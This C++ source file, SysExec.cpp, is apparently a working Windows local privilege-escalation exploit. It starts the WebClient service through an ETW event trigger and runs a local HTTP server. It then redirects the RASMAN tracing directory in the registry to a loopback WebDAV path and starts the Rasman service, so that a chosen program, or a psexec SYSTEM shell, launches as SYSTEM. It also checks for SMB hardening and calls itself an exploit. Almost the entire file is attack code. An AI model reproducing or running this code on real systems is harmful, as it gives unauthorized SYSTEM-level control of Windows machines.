// SysExec.cpp : définit le point d'entrée pour l'application console.
//

#include "stdafx.h"
#include <evntprov.h>

bool StartWebClientService()
{
	REGHANDLE hReg;
	bool success = false;
	const GUID WebClientServiceTrigger =
	{ 0x22B6D684, 0xFA63, 0x4578,
	{ 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7 } };

	if (EventRegister(&WebClientServiceTrigger, NULL, NULL, &hReg) == ERROR_SUCCESS)
	{
		EVENT_DESCRIPTOR eDesc;
		EventDescCreate(&eDesc, 1, 0, 0, 4, 0, 0, 0);
		success = EventWrite(hReg, &eDesc, 0, nullptr) == ERROR_SUCCESS;
		EventUnregister(hReg);
	} // Now wait for the service to be running
	SC_HANDLE schSCM;
	SC_HANDLE schSvc;
	SERVICE_STATUS ssStatus;
	schSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (NULL == schSCM)
		printf("Failed OpenSCManager: %d\n", GetLastError());

	schSvc = OpenService(schSCM, L"WebClient", SERVICE_QUERY_STATUS);
	if (NULL == schSvc)
		printf("Failed OpenService: %d\n", GetLastError());
	do
		QueryServiceStatus(schSvc, &ssStatus);
	while (ssStatus.dwCurrentState != SERVICE_RUNNING);
	printf("WebClient service started.\n");

	CloseServiceHandle(schSvc);
	CloseServiceHandle(schSCM);
	return success;
}

void RunHttpServer(WCHAR** bin_path)
{
	HttpServer server;
	WCHAR rbin_path[MAX_PATH];

	if (!wcscmp(*bin_path, L"-i")) {
		WCHAR cur_path[MAX_PATH];
		GetCurrentDirectory(MAX_PATH, cur_path);
		swprintf_s(rbin_path, L"cmd /c \"start /d \"%s\" /b psexec.exe -s -i cmd.exe\"", cur_path);
	} else {
		WCHAR full_path[MAX_PATH] = { 0 };
		GetFullPathName(*bin_path, MAX_PATH, full_path, NULL);
		wprintf(L"Program to launch: \"%s\"\n", full_path);
		swprintf_s(rbin_path, L"cmd /c start \"\" \"%s\"", full_path);
	}
	server._cmd = rbin_path;
	server.run();
}

void StartConnectingService()
{
	WCHAR* svcName = L"Rasman";
	SC_HANDLE schSCM;
	SC_HANDLE schSvc;
	schSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (NULL == schSCM)
		printf("Failed OpenSCManager: %d\n", GetLastError());
	schSvc = OpenService(schSCM, svcName, SERVICE_START);
	if (NULL == schSvc)
		wprintf(L"Failed OpenService %s: %d\n", svcName, GetLastError());
	if (!StartService(schSvc, 0, NULL))
		wprintf(L"Failed Starting %s: %d\n", svcName, GetLastError());
	CloseServiceHandle(schSvc);
	CloseServiceHandle(schSCM);
}

void ExitIfHardened() {
	DWORD sign = 0, spn = 0;
	DWORD sDW = sizeof(DWORD);
	RegGetValue(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters", L"RequireSecuritySignature", RRF_RT_ANY, NULL, &sign, &sDW);
	RegGetValue(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters", L"SmbServerNameHardeningLevel", RRF_RT_ANY, NULL, &spn, &sDW);
	
	if (sign || spn) { printf("Not vulnerable: SMB is hardened (signature=%d; spn=%d)\n", sign, spn); exit(1); }
}

int wmain(int argc, WCHAR* argv[])
{
	if (argc != 2) {
		printf("Usage:\n\tSysExec.exe <program>\n\n\t<program>:\tPath to the program to be run as system (noninteractive)\n\
			   			\nIMPORTANT: While you are system, stop the rasman service if you need to launch the exploit again.\n");
		return 1;
	}
	// Check if Windows SMB is hardened; if so, the SMB service won't be vulnerable
	ExitIfHardened();

	HANDLE h_Tsrv = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&RunHttpServer, &argv[1], 0, NULL);
	StartWebClientService();

	// Initialize connecting service
	HKEY hKey;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Tracing\\RASMAN", 0, NULL,
		REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey, NULL);
	DWORD data = 1; WCHAR* fileDir = L"\\\\127.0.0.1@8989\\tracing";
	RegSetValueEx(hKey, L"FileDirectory", 0, REG_EXPAND_SZ, (LPBYTE) fileDir, sizeof(WCHAR) * wcslen(fileDir) + 1);
	RegSetValueEx(hKey, L"EnableFileTracing", 0, REG_DWORD, (LPBYTE) &data, sizeof(DWORD));
	
	// If not running as a thread, the service will take longer to respond
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&StartConnectingService, NULL, 0, NULL);
	WaitForSingleObject(h_Tsrv, INFINITE); // Wait for SMB communications to be finished

	// Clean connecting service
	data = 0; fileDir = L"%windir%\\tracing";
	RegSetValueEx(hKey, L"EnableFileTracing", 0, REG_DWORD, (LPBYTE) &data, sizeof(DWORD));
	RegSetValueEx(hKey, L"FileDirectory", 0, REG_EXPAND_SZ, (LPBYTE) fileDir, sizeof(WCHAR) * wcslen(fileDir) + 1);
	RegCloseKey(hKey);
	return 0;
}
